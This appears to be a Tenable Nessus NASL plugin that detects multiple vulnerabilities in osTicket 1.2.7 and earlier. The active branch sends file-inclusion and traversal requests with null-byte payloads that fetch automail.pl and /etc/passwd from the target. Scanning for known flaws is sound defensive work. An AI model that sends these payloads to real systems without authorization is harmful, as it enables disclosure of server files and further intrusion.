#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18193);
  script_version("$Revision: 1.2 $");

  script_cve_id(
    "CAN-2005-1436",
    "CAN-2005-1437",
    "CAN-2005-1438",
    "CAN-2005-1439"
  );
  script_bugtraq_id(13478);

  name["english"] = "osTicket <= 1.2.7 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
The version of osTicket installed on the remote host suffers from
several vulnerabilities, including:

  - A Remote File Include Vulnerability
    The script 'include/main.php' lets an attacker read 
    arbitrary files on the remote host and possibly even run
    arbitrary PHP code, subject to the privileges of the web
    server user.

  - Two SQL Injection Vulnerabilities
    An authenticated attacker can affect SQL queries through 
    the 'id' parameter of the 'admin.php' script as well as 
    the 'cat' parameter of the 'view.php' script.

  - Multiple Cross-Site Scripting Vulnerabilities
    osTicket does not properly sanitize user-supplied input
    in several scripts, which could facilitate the theft of
    cookie-based authentication credentials within the
    context of the affected website.

  - A Directory Traversal Vulnerability
    The 'attachments.php' script may let an authenticated 
    attacker read arbitrary files on the remote, subject to 
    the privileges of the server user. This occurs only if 
    attachment uploads have been specificall enabled by the
    administrator.

See also : http://www.gulftech.org/?node=research&article_id=00071-05022005
Solution : A patch is expected from the vendor shortly.
Risk factor : High";
  script_description(english:desc["english"]);

  summary["english"] = "Checks for multiple vulnerabilities in osTicket <= 1.2.7";
  script_summary(english:summary["english"]);

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("osticket_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/osticket"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Check for the vulnerability.
  #
  # - if safe checks are enabled...
  if (safe_checks()) {
    if (ver  =~ "^(0\.|1\.([01]\.|2\.[0-7]|3\.[01]))") {
      desc = str_replace(
        string:desc["english"],
        find:"Solution :",
        replace:string(
          "***** Nessus has determined the vulnerability exists on the remote\n",
          "***** host simply by looking at the version number of osTicket\n",
          "***** installed there.\n",
          "\n",
          "Solution :"
        )
      );
      security_hole(port:port, data:desc);
      exit(0);
    }
  }
  # - otherwise, try to exploit the file include vulnerability.
  else {
    # Try to grab a file included in the distribution.
    req = http_get(
      item:string(
        dir, "/include/main.php?",
        "config[search_disp]=true&",
        # nb: try to grab automail.pl in osticket's main directory.
        "include_dir=../automail.pl%00"
      ),
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # It's a problem if we could retrieve the file.
    if (egrep(string:res, pattern:"^#!/usr/(local/)?bin/perl", icase:TRUE)) {
      security_hole(port);
      exit(0);
    }

    # If that failed, try to grab /etc/passwd.
    req = http_get(
      item:string(
        dir, "/src/main.inc.php?",
        "config[path_src_include]=/etc/passwd%00"
      ),
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # It's a problem if there's an entry for root.
    if (egrep(string:res, pattern:"root:.+:0:")) {
      security_hole(port);
      exit(0);
    }
  }
}
